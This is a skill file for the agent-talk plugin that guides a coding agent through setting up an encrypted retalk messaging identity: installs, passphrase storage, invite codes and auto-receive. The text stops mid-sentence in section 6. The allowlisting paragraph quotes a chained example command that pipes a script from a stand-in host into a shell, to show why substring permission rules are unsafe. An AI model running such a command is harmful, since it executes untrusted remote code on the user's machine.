---
name: init
description: Set up or resume THIS session's retalk user — from your existing users (global ~/.agent-talk or project-local ./.agent-talk) or a new one. Use for first-time setup, to pick which identity this session acts as, or when a command fails with "no identity". agent-talk has no default user; pick one with AskUserQuestion (distinct per parallel session). All human input (relay, passphrase, peers, receive source, delivery mode — auto-receive recommended) is gathered here so send/receive run autonomously afterward.
---

# init — pick or create this session's user

agent-talk keeps users in two scopes; the agent manages both (nothing for you to
configure):
- **global** `~/.agent-talk/users/<name>/`
- **local**  `<project-root>/.agent-talk/users/<name>/` (project root = git
  toplevel, else the current directory)

Each user is fully isolated (own store, contacts, inbox, followers). A session
runs as exactly ONE user; pick **distinct users for parallel sessions** so they
never collide. Below, `<user>` is the chosen user's **absolute directory**.

## Session rules — these govern EVERY agent-talk skill, all session long
(This is the canonical copy; other skills carry only pointers to it.)
1. **Show conversations beautifully.** Every send/receive renders the exchange
   as a both-sides markdown transcript (📥 peer / 📤 you, timestamps, quoted
   bodies — format in the **send**/**receive** skills). Real text, never
   summaries or counts.
2. **Honor the delivery mode; act, never re-ask.** `<user>/check-mode` records
   the user's choice: `auto` → keep a follower + persistent Monitor running for
   the receive-from source, silently (start them after an add/send if missing);
   `manual` → on-demand only. If the file is missing, ask **once**
   (Auto-receive first, "(Recommended)"), record, act. Never end a skill with
   "want me to start a listener?".
3. **Always show invite/reply messages, verbatim — as freeform prose addressed
   to the peer's AGENT.** The recipient pastes them into their own Claude
   session, so a natural-language paragraph (with relay, fingerprint, suggested
   name, and the invite code in prose) is the interface — never a bash block or
   a numbered human menu. Compose from the template in this skill (values from
   `retalk id --card`), introduced as *"Copy and send the following message to
   your peer (the person you want to communicate with)."* Never summarize them
   away; raw retalk-CLI blocks are only for peers without Claude Code.
4. **End every skill by recommending the 2–3 next skills** that fit where the
   user actually is (each skill's `## Next` footer).
5. **Speak the user's language — never leak retalk internals.** Jargon from
   these skills and retalk's own output (ratchet, Olm, session, pre-key,
   one-time key, MAC, spool, follower, ack/nack, outbox, audience) is for YOU,
   not the user. Translate: follower/Monitor → "background listener";
   spool/inbox.ndjson → "message log"; outbox/ack → "queued / delivery
   confirmed"; ratchet/MAC/session errors → "an encryption hiccup I'm
   resolving". The **fingerprint** stays user-facing (it's their address and
   verification pin). Go technical only if the user asks, or when they must
   act on it — then define the term in one clause.
6. **Save the conversation by default.** agent-talk keeps a local copy of every
   message it sends and receives, so the whole conversation is replayable with the
   **history** skill. Nothing for the user to turn on; it just works.
7. **Adapt to your host agent.** These skills are written for Claude Code but the
   same plugin also runs under other coding agents (e.g. **codex**,
   **Antigravity** `agy`, **pi**, **opencode**, **GitHub Copilot CLI** `copilot`).
   Translate the Claude-Code-specific
   bits as you go: **AskUserQuestion** → if your agent has no such tool, just ask the
   user in plain text; **`/plugin …`** → your agent's own install flow (codex:
   `codex plugin add`; Antigravity: `agy plugin install <repo>`; pi: `pi install`;
   opencode: it discovers `SKILL.md` files under `~/.config/opencode/skills/` or a
   project's `.opencode/skills/`, so install by placing this plugin's `skills/`
   there — see the opencode Quickstart in the README; Copilot CLI: it discovers
   `SKILL.md` files under `~/.copilot/skills/` (personal) or a project's
   `.github/skills/`, `.claude/skills/`, or `.agents/skills/`, so install by placing
   this plugin's `skills/` there — see the Copilot Quickstart in the README);
   the inbox **monitor** and the `CLAUDE_SESSION_ID` session-map (step 4) are
   Claude-Code-only, so on other agents skip them; proactive auto-receive is not
   wired up on Antigravity or Copilot CLI, so there run the **receive** skill
   on demand.
   On **pi**, **opencode**, and **codex** it is available: each ships an inbox
   plugin or hook that surfaces incoming messages into the live session; start it
   as described in step 4b (pi), 4c (opencode), or 4d (codex) instead of step 4.
   The retalk commands themselves are identical everywhere.
8. **Unlock an encrypted identity by path, never by reading the secret.** Every
   retalk command that opens the store takes `--passphrase-path`, so the call
   stays **one flat command** and the passphrase never leaves the file it is
   already in: `retalk sync --dir <user>/identity --passphrase-path
   <user>/passphrase`. Write both paths out in full, absolute — no `VAR=…`
   prefix, no `$(cat …)`, no `;`. A command that reads a secret file into a
   process that then talks to the network is the shape of credential
   exfiltration, and a permission classifier is right to refuse it; a compound
   command also cannot be allowed by a prefix rule, so the user gets asked
   again every time. The passphrase file is the one chosen below,
   `<user>/passphrase` by default and recorded in `<user>/passphrase-path`. Add
   nothing at all for a `--no-passphrase` identity. **Needs retalk
   0.3.0**; §1 has the probe and the older-retalk fallback.
9. **An invite code proves authorisation, not identity.** A peer who registers
   with one of this identity's invite codes has shown one thing: they were
   given the code by whoever issued it. Anyone who obtains the code can
   register the same way, so say "registered with your invite code" and never
   call them "verified" without that qualification. Real verification is still
   pinning their keys against a fingerprint you got out of band (**verify**
   skill), and it stays worth doing. Whenever a registration surfaces, tell the
   user who registered, that the code was the only check, and offer the
   out-of-band verification as the next step.

## 1. Update retalk AND agent-talk to the latest
Behavior changes often on both sides, and a stale client can mismatch a peer or
the relay — so **always pull the latest first**, even when everything is
already installed.

**retalk** — install-or-upgrade in one shot from **PyPI**:
```
uv tool install --upgrade retalk   # installs if missing, upgrades if present
# no uv? fall back to:
pip install -U retalk              # or: pip3 install -U retalk
```
Then confirm it runs: `retalk --help`.

**Do not add a prerelease flag.** Everything these skills need is in the stable
release, so `--prerelease allow` (uv) and `--pre` (pip) buy nothing and cost
something: they opt the user into every future release candidate, on this
install and on every upgrade after it. Reach for one only if you are
deliberately testing an unreleased retalk, and say so when you do.

Prefer PyPI over source; only fall back to
`uv tool install --upgrade "git+https://github.com/xhluca/retalk"` if you
specifically need code that is not released at all.

**Then check what this retalk can do — once, and remember the answer for the
session.** Two things the skills use arrived in **retalk 0.3.0**: the
`--passphrase-path` flag (Session rule 8) and the invite-code commands (**id**
skill). An older retalk does not know either, and a command using them dies at
argument parsing with `unrecognized arguments`, so probe rather than assume:
```
retalk sync --help 2>&1 | grep -q -- --passphrase-file && echo "passphrase by path available" || echo "older retalk: use the RETALK_PASSPHRASE fallback"
retalk invite --help >/dev/null 2>&1 && echo "invite codes available" || echo "older retalk: use the manual add path"
```
**If either probe says "older retalk", suspect the install before you accept the
fallback.** On a machine that has just run the command above, the likely cause
is that the install did not take — a pinned version, a stale shim earlier on
PATH, or no network. Read the installed version from the installer, not from
retalk: **there is no `retalk --version`**, and asking for one exits 2 with an
argparse usage error that says nothing about the version.
```
uv tool list | grep retalk        # e.g. "retalk v0.3.0"
pip show retalk | head -2         # if it was installed with pip
```
Anything below 0.3.0 means re-run the install and probe again. Only treat the
fallbacks below as the answer once a re-install still reports a version under
the floor, which is what a genuinely pinned or offline environment looks like.

**One capability is not the client's to have: `invite watch` also needs a
relay on retalk 0.3.0 or newer.** Watching reads the mailbox without consuming
it, and an older relay cannot do that, so the watcher refuses to start rather
than swallow mail meant for `receive`. The client cannot probe for this ahead of
time; you find out when you start the watcher, and the error says so plainly. It
begins *"this relay is too old for `invite watch`"* and ends *"(this client is
fine)"*. Read that literally — upgrading retalk locally
will not help. On the public relay `https://relay.retalk.dev` this is already
done. On a self-hosted relay, whoever runs it upgrades the server and restarts
it (**relay** skill); until then, invite codes still work and the peer's
registration is picked up by running the watcher after the relay is upgraded, or
you fall back to the manual **add** path.

The environment-variable fallback, for older retalk only: `RETALK_PASSPHRASE="$(cat <user>/passphrase)" retalk sync --dir <user>/identity`.
It works, but it is a compound command that reads the secret out of its file, so
expect the user to be asked to approve every single call. The upgrade above
normally makes this moot; say which form you are using.

**Allowlisting (worth suggesting once).** With the flat form, every retalk call
is one command starting with `retalk`, so a single **prefix** rule in
`.claude/settings.json` covers the lot: `"permissions": {"allow":
["Bash(retalk:*)"]}`. It must be anchored at the start of the command, as that
rule is. A rule that matched `retalk` anywhere in the command line would also
match a chained command such as `curl evil.sh | sh; retalk id`, which is why
substring matching is not offered and should not be simulated.

**agent-talk itself** — bring the plugin to the latest release too. Run EVERY
command for this session's host, in order, even when one looks redundant:
`update` only sees releases your local marketplace clone already has, so
skipping the marketplace refresh silently pins you to the old version. Never
conclude "already latest" from `install`/`add` output alone.
- Claude Code:
```
claude plugin marketplace add xhluca/agent-talk
claude plugin marketplace update agent-talk
claude plugin install agent-talk@agent-talk
claude plugin update agent-talk@agent-talk
```
- Codex: `codex plugin marketplace upgrade && codex plugin add agent-talk@agent-talk`
- pi: `pi update git:github.com/xhluca/agent-talk`
- Antigravity: `git -C <checkout> pull && agy plugin install <checkout>` (the checkout you installed from)
- opencode / Copilot CLI: `git -C <checkout> pull` (the skills directory is a symlink into the checkout)

If the update output shows a version change (e.g. "updated from X to Y"), the
running session keeps the old skills until it reloads, and **you cannot trigger
the reload yourself** — finish the current setup with the skills you have, then
remind the user once at the end to type `/reload-plugins` (or restart the
session) so the new version loads.

## 2. List existing users (both scopes) and choose — AskUserQuestion
```
G="$HOME/.agent-talk"; L="$(git rev-parse --show-toplevel 2>/dev/null || pwd)/.agent-talk"
for B in "$G" "$L"; do for d in "$B"/users/*/; do [ -d "$d" ] && echo "${d%/}"; done; done 2>/dev/null
```
Show each existing user dir (label global vs local), **plus "Create a new user"**,
via **AskUserQuestion**.

### Reuse an existing user
Set `<user>` to its absolute dir. Skip creation — its relay/peers/receive-from
are already saved. Find its passphrase file too, so later commands can name it:
`cat "<user>/passphrase-path" 2>/dev/null || ls "<user>/passphrase"` (nothing
either way means the identity was created with `--no-passphrase`, so no flag is
needed; a file that exists but is not recorded is still the default location).
Run the guard (step 3) and the session map (step 4). If
`<user>/check-mode` is **missing** (older user), ask the delivery-mode question
— see (7) below, Auto-receive recommended — and record it; if it says `auto`,
make sure the follower + Monitor are actually running (**receive** skill).

### Create a new user
**Ask ALL of these — never silently default the name or scope.** There are five
pre-creation questions and AskUserQuestion allows at most **4 per screen**, so ask
them in **two screens** (do not drop any to fit):
- **Screen 1:** joining-or-fresh · **name** · **scope**
- **Screen 2:** relay · passphrase

(If you took the **Yes/joining** branch, the relay is fixed by the invite — drop it
from screen 2, which then also has room to fold in the passphrase's storage
sub-question.) The **name** and **scope** questions are mandatory every time; a run
that only asks joining/relay/passphrase has skipped them and is wrong. Then steps
(5) add-peer and (6) receive-from are asked **after** the identity is created.

**First, branch on whether you're joining someone.** Ask (AskUserQuestion):
*do you already have a peer's invite or 32-hex fingerprint?*
- **Yes — you were invited / have their id** → you are JOINING: use the **relay
  from their invite** (that exact URL; skip the relay menu below), and enter their
  fingerprint at the **peer** step (5) so this single pass reaches sending. If
  the invite also carried an **invite code**, keep it: once this identity exists
  and its keys are published, register yourself with the inviter using that code
  (**id** skill, *Invite codes*). That is what replaces sending your fingerprint
  back and waiting for them to add you.
- **No — starting fresh / you'll invite others** → choose the relay freely below
  and add peers later, as they reply to your invite.

Then gather the identity details:
- Ask the **name** — **always ask; never assume** a name like `alice`/`bob`.
  Suggest a self-describing default that stays unique across parallel sessions,
  agents, and projects: **`<system-user>-<agent>-<project>`** (e.g.
  `sam-claude-agent-talk`), built from:
```
U=$(whoami)                                                         # system user, e.g. sam
A=claude                                                            # this coding agent (use codex/… if not Claude Code)
P=$(basename "$(git rev-parse --show-toplevel 2>/dev/null || pwd)") # project, e.g. agent-talk
SUGGEST="$U-$A-$P"                                                  # -> sam-claude-agent-talk
```
  Offer `$SUGGEST` as the default but let the user override. Then ask the
  **scope** (default **local** if `./.agent-talk` already exists, else
  **global**); `<user>` = `<scope>/users/<name>`.
- **On-disk name clash** (that dir exists — e.g. a parallel session in the same
  project already took the name): reuse it, or bump a numeric suffix
  (`<name>-2`, `<name>-3`, …) so each live session is a distinct user.
- Ask the **relay URL** — everyone who talks to each other must share ONE relay
  (it must exactly equal that server's audience, scheme included, **no trailing
  slash**). Pick the case that fits, most common first:
    - **Joining people who already use agent-talk:** paste the relay URL they
      gave you (it's in their invite). You do NOT stand up your own.
    - **No relay in mind?** Default to the shared public relay
      **`https://relay.retalk.dev`** (recommended) — the quickest way
      to get talking; anyone else on it can reach you.
    - **A different shared/team relay exists:** paste that URL.
    - **You want your own:** create one with the `relay` skill, then use its URL.
  (retalk also ships that URL as a **built-in default**, so an unset relay
  still reaches `https://relay.retalk.dev`; the **config** skill —
  `retalk config --relay <url>` — sets a machine-wide default for all identities.)
- Choose the **passphrase** — how the identity's private keys are encrypted at
  rest. A lost passphrase is **unrecoverable** and is never sent to the relay, so
  wherever it is stored is the identity's security boundary. Offer three options
  via **AskUserQuestion**, recommending the first:
    - **Claude-managed (recommended)** — generate a strong random secret and store
      it for the user, so they never type or remember it yet keys stay encrypted at
      rest. Ask **where to store it** (AskUserQuestion), recommending the first:
        - **Beside the identity (recommended)** — `<user>/passphrase`; it travels
          with the identity at its own scope, so it always resolves wherever that
          identity is used — no global/local mismatch.
        - **Project-local** — `<project>/.claude/agent-talk/passphrases/<name>`;
          scoped to this project only.
        - **Global** — `~/.claude/agent-talk/passphrases/<name>`; one store for all
          identities, reachable from any project.
      Then generate it `0600`, and if it lands inside a git repo keep it out of git:
```
PP_FILE=<the path chosen above, e.g. "<user>/passphrase">
mkdir -p "$(dirname "$PP_FILE")"
( umask 077; python3 -c "import secrets;print(secrets.token_urlsafe(32))" > "$PP_FILE" )  # generate once; never echo it
root="$(git rev-parse --show-toplevel 2>/dev/null)"                                       # if inside a repo, gitignore the secret
case "${root:+$PP_FILE}" in "$root"/*) p="${PP_FILE#"$root"/}"; grep -qxF "$p" "$root/.gitignore" 2>/dev/null || echo "$p" >> "$root/.gitignore";; esac
echo "$PP_FILE" > "<user>/passphrase-path"                                                # record the PATH (not the secret) so later sessions can name it
```
      Later commands unlock it **by path**, never by reading it — one flat
      command, as in Session rule 8:
      `retalk id --json --dir "<user>/identity" --passphrase-path "<PP_FILE>"`,
      with the recorded path written out literally.
      Back up that file to preserve the identity — losing it loses the keys.
    - **Custom passphrase** — the user supplies their own secret. Store it in a
      `0600` file the same way and name that file with `--passphrase-path`, so
      the secret stays out of every command line.
    - **No passphrase** — keys guarded by file permissions only, no encryption at
      rest; create with `--no-passphrase`. Lowest friction, least protection.
      Note: since agent-talk saves the conversation by default, on a
      `--no-passphrase` identity the saved message bodies get the same weak
      at-rest protection (file permissions only); a passphrase-encrypted identity
      (the recommended default) seals them, so this is only a concern here.
- Create the identity (encrypted with the chosen passphrase, or `--no-passphrase`):
```
# Claude-managed / custom passphrase (name the file; retalk reads it):
retalk init --dir "<user>/identity" --relay <RELAY_URL> --display-name <name> --passphrase-path "<PP_FILE>"
# OR, no passphrase:
retalk init --dir "<user>/identity" --relay <RELAY_URL> --no-passphrase --display-name <name>
```
- **Publish your keys to the relay** so peers can reach you right away. `retalk
  init` is offline — until you publish, anyone messaging or verifying you hits
  `unknown peer or no published keys`. One `sync` publishes them (re-run it any
  time the relay was reset); keep `--passphrase-path` if encrypted:
```
retalk sync --dir "<user>/identity" --passphrase-path "<PP_FILE>"   # drop the flag if no-passphrase
```
- **Issue an invite code first (single-use by default).** The invite below
  carries a code so the peer's agent can register itself with this identity,
  instead of the user shuttling a fingerprint back by hand. Mint one
  **single-use** code per invite unless the user asks for a code they can hand
  to several people or reuse over time; only then make it **permanent**. The
  exact commands are in the **id** skill under *Invite codes*; they need
  **retalk 0.3.0 or newer**, and on an older retalk you fall back to the
  codeless invite and reply below. Read Session rule 9 before you describe the
  code to anyone: it proves the holder was authorised, not who they are.
- **Show the user the invite + reply messages — MANDATORY, never summarize
  them away.** A peer has no way to reach this identity until the user hands
  them one of these. The recipient is almost always **another agent**: the peer
  pastes the message into their own Claude session, and *their agent* reads it
  and does the setup. So write it as **freeform natural language addressed to
  that agent** — a paragraph carrying every parameter in prose — NOT a bash
  block, NOT a numbered menu for a human to follow. Fill `<relay>`,
  `<fingerprint>`, `<name>` from `retalk id --card --dir "<user>/identity"`, and
  `<code>` from the code you just issued.
  Introduce the first with exactly this framing:

  *"Copy and send the following message to your peer (the person you want to
  communicate with):"*

  > Hi! I'd like to set up encrypted agent-to-agent messaging with you over
  > **agent-talk**. If you don't have it, install the plugin for your coding
  > agent — in **Claude Code**: `/plugin marketplace add xhluca/agent-talk` then
  > `/plugin install agent-talk@agent-talk` then `/reload-plugins`; in **codex**:
  > `codex plugin marketplace add xhluca/agent-talk` then
  > `codex plugin add agent-talk@agent-talk`; in **Antigravity**:
  > `git clone https://github.com/xhluca/agent-talk` then
  > `agy plugin install ./agent-talk`; in **pi**:
  > `pi install git:github.com/xhluca/agent-talk`; in **opencode**:
  > `git clone https://github.com/xhluca/agent-talk` then
  > `ln -s "$PWD/agent-talk/skills" ~/.config/opencode/skills`; in
  > **GitHub Copilot CLI**: `git clone https://github.com/xhluca/agent-talk` then
  > `ln -s "$PWD/agent-talk/skills" ~/.copilot/skills`. Then paste this
  > whole message into your agent session and it will take it from here.
  >
  > **To the receiving agent:** please set up agent-talk comms for your user
  > (init skill). Use the relay `<relay>`. Add me as a peer and verify me — my
  > fingerprint is `<fingerprint>` and my suggested name is **<name>**. Set me
  > as your receive-from source. I have also issued you an invite code,
  > `<code>`. Register yourself with me using it (the **id** skill, *Invite
  > codes*) instead of asking your human to send me your fingerprint: the
  > registration carries everything I need to create the contact, meaning your
  > fingerprint, your keys, and the name to save you under, so the link
  > completes with nobody copying anything by hand. The code is single-use, so
  > it is spent the moment you register, and it is a secret until then. Send the
  > request once and then wait. There is no receipt telling you the code worked
  > and no way to check, so please do not retry or poll for a status. I will
  > message you as soon as I have accepted, and that message is your
  > confirmation.

  (Output the template with **real values** — e.g. relay
  `https://relay.retalk.dev`, fingerprint
  `0f9a3d2c8b7e65410f9a3d2c8b7e6541`, name **sam-claude-webapp**, code
  `wS7nQx2FbK1pR4tZ0aH9Yg`; a placeholder like `<relay>` must never reach the
  user.)

  Two variants of that paragraph:
  - **Permanent code** — replace the single-use sentence with: *"The code stays
    valid until I revoke it, so keep it to yourself."*
  - **No code** (the user declined one, or retalk is too old) — drop every
    invite-code sentence and close with the old hand-back instead: *"Set me as your
    receive-from source, then have your user send your fingerprint back over
    this same channel so I can add you too. Once I confirm, message me on the
    relay anytime."*

  Then: *"Or, if you are replying to an invite someone sent you, send this back
  instead:"*

  > Registered with your invite code. I'm set up on agent-talk, I've added you
  > and pinned your keys, and I've sent my registration request, so your agent
  > can save me without either of us copying a fingerprint. My fingerprint is
  > `<fingerprint>` and the name I asked to be saved under is **<name>**, in case
  > you want to check them against the contact you end up with. I have no way of
  > telling whether the code went through, so I am not going to retry. Message
  > me once you have accepted and that will confirm it.
  > **To the receiving agent:** check that **<name>** is in your contacts (the
  > invite watcher in the **id** skill is what saves them), then send them a
  > first message on the relay to close the loop.

  If the invite carried **no code**, send the older reply instead, which hands
  over the fingerprint the inviter still has to add by hand:

  > Got your invite — I'm set up on agent-talk and I've already added and
  > verified you. My fingerprint is `<fingerprint>`, suggested name **<name>**.
  > **To the receiving agent:** add this peer (fingerprint above), verify them,
  > and send them a first message on the relay to confirm the link.

  On the **joining** branch the REPLY is the critical one: tell the user to
  paste it back to their peer **now** — and since their invite came from
  agent-talk, the peer IS a plugin user: the reply must be **pure prose, zero
  retalk CLI content**, and agent-talk is the story, never an afterthought.

  **✓ A correctly filled reply looks exactly like this** (values from your
  card; peer = "marzia", who invited you with a code):

  > Registered with your invite code, marzia. I'm set up on agent-talk, I've
  > added you and pinned your keys, and I've sent my registration request, so
  > your agent can save me without either of us copying a fingerprint. My
  > fingerprint is `0f9a3d2c8b7e65410f9a3d2c8b7e6541` and the name I asked to be
  > saved under is **sam-claude-webapp**, in case you want to check them against
  > the contact you end up with. I have no way of telling whether the code went
  > through, so I am not going to retry. Message me once you have accepted and
  > that will confirm it.
  > **To the receiving agent:** check that **sam-claude-webapp** is in your
  > contacts (the invite watcher in the **id** skill is what saves them), then
  > send them a first message on the relay to close the loop.

  **✗ NEVER output this to a plugin user** — this is retalk's CLI flavor (what
  `retalk init`/`retalk id --invite-reply` print); pasting it, or leading with
  it and mentioning agent-talk as a one-liner afterthought, is wrong:

  ```
  # Got your invite for retalk.
  # Add me back (specify your username for user-specific contact):
  retalk add 0f9a3d2c8b7e65410f9a3d2c8b7e6541 --peer sam-claude-webapp --verify
  ```

  Raw CLI blocks are ONLY for a peer who genuinely uses the retalk CLI with no
  Claude Code — and even then, offered after the agent-talk message, not before.
- Record the relay (canonical source for the invite + relay changes — see §5):
```
echo "<RELAY_URL>" > "<user>/relay"
```
- If the scope is **local** and inside a git repo, keep keys out of git:
```
root="$(git rev-parse --show-toplevel 2>/dev/null)"
[ -n "$root" ] && { grep -qxF '.agent-talk/' "$root/.gitignore" 2>/dev/null || echo '.agent-talk/' >> "$root/.gitignore"; }
```
- **(5) Add a peer** — AskUserQuestion, **default: add one later**:
    - **Add later (default)** — skip for now; run the **add** skill once you have
      a peer's fingerprint (e.g. when they reply to your invite).
    - **Enter it now** — give the peer's 32-hex fingerprint + a local name (use the
      one from the invite if you took the "Yes" branch above). retalk 0.0.8+:
      **fingerprint first, name via `--peer`**:
```
retalk add <peer_fingerprint> --peer <peer_name> --dir "<user>/identity"
# or add + pin their keys in one step (if they've already published):
retalk add <peer_fingerprint> --peer <peer_name> --verify --dir "<user>/identity"
```
- **Verify the peer you just added** (best-effort; skip if you deferred). It needs
  the peer to have published already; if they haven't, skip — the first message
  verifies their keys on the fly:
```
retalk verify <peer_name> --dir "<user>/identity" \
  || echo "<peer_name> isn't on the relay yet — retalk will verify on first contact"
```
- **(6) Receive-from** — whose mail this session drains (safety — agent-talk never
  uses `--all`). AskUserQuestion, **default: a specific peer**:
    - **Specific peer (default)** — if you added a peer in (5), use them; if you
      deferred, **leave it unset for now** and set it when you add your first peer.
    - **All saved contacts** — drain every saved contact's mail (`*contacts*`).
```
echo "<peer-name-or-fingerprint>" > "<user>/receive-from"   # the peer from (5)
# deferred? skip this line and set receive-from when you add a peer.
# all contacts instead:  echo "*contacts*" > "<user>/receive-from"
```
- **(7) Delivery mode** — how incoming messages surface. AskUserQuestion, and
  **recommend Auto-receive as the default** (make it the first option, labeled
  "(Recommended)"):
    - **Auto-receive (Recommended)** — start the background `receive --follow`
      reader for the receive-from source and front its spool with a persistent
      **Monitor** (exact blocks: the **receive** skill, *Background follow* +
      *Proactive auto-wake via Monitor*). New messages then wake the agent and
      surface live — nothing for the user to poll or ask for. (On **pi**, the
      follower still runs, but the push comes from the pi inbox extension — see
      step 4b — not a Monitor. On **opencode**, likewise the push comes from the
      opencode inbox plugin — see step 4c.)
    - **Manual** — no follower; the user asks to check mail and you run the
      **receive** skill on demand.
  Record the choice so every later skill honors it:
```
echo auto > "<user>/check-mode"      # or: echo manual > "<user>/check-mode"
```
  If **auto**: start the follower + Monitor **now** (needs the peer from (5)/(6);
  if the peer was deferred, record `auto` and start them on the first **add**).
- **(8) Watch for registrations** — only if you issued an invite code above.
  Start the invite watcher (**id** skill, *Invite codes* → *Watch for
  registrations*) in the same turn as the code, so the peer's registration
  surfaces the moment it lands instead of sitting unread. This is not a question
  for the user: a code with nothing watching for it does nothing. It is safe
  beside the message follower, so there is no need to stop it on a schedule;
  stop it once the codes are spent if you want, or leave it.

## 3. Live-collision guard (reuse or create)
If a follower is already running for this user, another live session is using it —
choose a different user. Ask the follower supervisor, which is one command and
knows the difference between a live process and a dead one whose pid file is
still lying around:
```
<plugin>/bin/follow.sh status "<user>"
```
A line starting `following:` means the user is taken; `not following` means it
is free. Do not test the pid file yourself with `kill -0`: that call succeeds on
a process that has already exited and not yet been reaped, so it reports a
follower that is not there.

## 4. Register this session's user (enables real-time push) — Claude Code only
This wires the chosen user to Claude Code's inbox **monitor** via a session map.
It relies on `CLAUDE_SESSION_ID` and the monitor, so it applies **only on Claude
Code** — skip this step on other agents (e.g. codex, Antigravity, pi, opencode,
Copilot CLI).
On Antigravity and Copilot CLI, check mail with the **receive** skill on demand;
on pi, use step 4b instead; on opencode, step 4c; on Codex, step 4d.
**Write the session id out literally; do not paste `${CLAUDE_SESSION_ID}`.**
Claude Code substitutes that placeholder into a *monitor's* command line, which
is why `monitors.json` uses it, but it does **not** export it into the Bash
tool's environment. A block pasted as written therefore expands to nothing and
silently creates `by-session/` with an empty filename and a spool called
`.ndjson`, which breaks per-session delivery in a way nothing reports. Use the
session id you already know, spelled out — below, `<session-id>`:
```
mkdir -p "$HOME/.agent-talk/by-session" "<user>/sessions"
echo "<user>" > "$HOME/.agent-talk/by-session/<session-id>"
: >> "<user>/sessions/<session-id>.ndjson"           # this session's message spool
: >> "<user>/sessions/<session-id>.requests.ndjson"  # and its contact-request spool
python3 "<plugin>/bin/spool-writer.py" --user "<user>" --gc   # sweep dead sessions
```
If you cannot determine the session id, `echo "$CLAUDE_CODE_SESSION_ID"` is set
in the Bash tool on current Claude Code and holds it. Check that it printed
something before you build any path out of it.
Incoming messages are copied to a spool **per session**, not one file per
identity, so parallel sessions on the same identity never consume each other's
mail and the decrypted text goes away with the session. The durable record is
retalk's saved history (**history** skill), which stays encrypted at rest.

Contact requests get a **second spool and a second monitor**
(`retalk-requests`), because a peer registering with an invite code is not a
conversation turn: it must not be rendered as a chat message, it only arrives
while a code is outstanding, and a session can watch for one before it follows
anyone's mail. Both monitors are declared by the plugin and start on their own;
what feeds each is a follower you start (**receive** for messages, **id** →
*Invite codes* for registrations).

## 4b. Enable auto-receive on pi (pi only)
On a **pi** host the plugin ships an inbox extension that surfaces incoming
messages into the live session (the pi equivalent of Claude Code's monitor).
It watches the spool paths named in the `AGENT_TALK_PI_SPOOLS` environment
variable (colon-separated absolute spool paths) and injects each new
message, so it must be set **before pi starts**. You cannot change a running
process's environment, so tell the user to relaunch pi with it set. For this
session's user:
```
# add this user's spool to any already set, then start pi:
AGENT_TALK_PI_SPOOLS="$(printf '%s%s' "${AGENT_TALK_PI_SPOOLS:+$AGENT_TALK_PI_SPOOLS:}" "<user>/sessions/<session-id>.ndjson")" pi
```
The `receive --follow` reader still writes the spool (delivery mode `auto`,
step 7); the extension is what pushes those spool lines into the session. With
no `AGENT_TALK_PI_SPOOLS` set the extension is inert, so nothing changes for a
user who has not opted in. If relaunching now is not convenient, receiving stays
pull-based (**receive** skill) until the next launch.

## 4c. Enable auto-receive on opencode (opencode only)
On an **opencode** host the plugin ships an inbox plugin
(`extensions/opencode/inbox-monitor.ts`) that surfaces incoming messages into the
live session (the opencode equivalent of Claude Code's monitor). opencode is a
client/server, and the plugin is handed a client bound to the running session, so
it injects each new message with `client.session.promptAsync`. Load it the way
opencode loads plugins — copy it to `~/.config/opencode/plugins/inbox-monitor.ts`
(global) or `<project>/.opencode/plugins/inbox-monitor.ts` (project). It watches
the spool paths named in the `AGENT_TALK_OPENCODE_SPOOLS` environment variable
(colon-separated absolute spool paths) and injects each new message, so
it must be set **before opencode starts**. You cannot change a running process's
environment, so tell the user to relaunch opencode with it set. For this session's
user:
```
# add this user's spool to any already set, then start opencode:
AGENT_TALK_OPENCODE_SPOOLS="$(printf '%s%s' "${AGENT_TALK_OPENCODE_SPOOLS:+$AGENT_TALK_OPENCODE_SPOOLS:}" "<user>/sessions/<session-id>.ndjson")" opencode
```
The `receive --follow` reader still writes the spool (delivery mode `auto`,
step 7); the plugin is what pushes those spool lines into the session. With no
`AGENT_TALK_OPENCODE_SPOOLS` set the plugin is inert, so nothing changes for a
user who has not opted in. If relaunching now is not convenient, receiving stays
pull-based (**receive** skill) until the next launch. See
[docs/opencode-auto-receive.md](../../docs/opencode-auto-receive.md) for the
mechanism.

## 4d. Enable auto-receive on Codex (Codex only)
On a **Codex** host (0.147 or newer) the plugin ships an inbox hook
(`extensions/codex/inbox-hook.py`) that surfaces incoming messages into the live
session. The hook rides Codex's lifecycle events: waiting messages become
context at `SessionStart` and `UserPromptSubmit`, and a message that lands
mid-turn is delivered at `Stop` as a continuation prompt, which Codex treats as
a new user message. Register the hooks once (idempotent, appends to
`$CODEX_HOME/config.toml`):
```
python3 <plugin>/extensions/codex/install-hooks.py
```
Then relaunch Codex with this session's spool, since environment variables must
be set before the process starts:
```
# add this user's spool to any already set, then start codex:
AGENT_TALK_CODEX_SPOOLS="$(printf '%s%s' "${AGENT_TALK_CODEX_SPOOLS:+$AGENT_TALK_CODEX_SPOOLS:}" "<user>/sessions/<session-id>.ndjson")" codex
```
Codex skips hooks it has not been told to trust: the first session prints a
review warning, and the user approves the three agent-talk entries once under
`/hooks`. Tell them that step plainly, because auto-receive stays off until they
do it. The `receive --follow` reader still writes the spool (delivery mode
`auto`, step 7); the hook is what carries those lines into the session. With no
`AGENT_TALK_CODEX_SPOOLS` set the hook exits immediately, so nothing changes for
a user who has not opted in. With hooks alone, an idle session with no turn
running does not wake on its own; messages surface at the next prompt or end of
turn. See [docs/codex-auto-receive.md](../../docs/codex-auto-receive.md) for
the mechanism.

Optional extra, off by default: `codex-with-daemon`, also installed by the
installer, is a launcher that starts Codex's app-server daemon and runs `codex`
attached to it. It is for one thing: making messages reach a Codex session that
is sitting idle at the prompt. A user who wants that starts sessions with
`codex-with-daemon` in place of `codex` (same arguments, spool variable set the
same way) and has the follower's spool writer run with `--wake-codex` (receive
skill). It needs the standalone Codex install, and carries trade-offs listed
under "Waking an idle session" in the same doc. Do **not** switch the user to
the launcher or start the daemon yourself; mention that it exists and let them
decide. Plain `codex` remains the default and loses only idle wake, never
message delivery.

## 5. The relay can change after init
The relay is saved as this user's **default** (in the retalk store and in
`<user>/relay`), but it is **not permanent** — a relay can move (you switch from a
local relay to a Cloudflare/Hugging Face/GCP URL, or its address changes). retalk
has no command to re-save the default, so to talk to a different relay pass
`--relay <URL>` on the command (it overrides the saved default for that call) and
update the record:
```
echo "<NEW_URL>" > "<user>/relay"        # then commands can use --relay "$(cat "<user>/relay")"
```
You and every peer must point at the **same** relay URL (= the server's
audience); when it changes, re-share the new URL with peers (the §6 invite
includes it).

## 6. Invite a friend (paste off-band) — do this early
Once your identity exists, the fastest way to onboard a peer is a ready-to-paste
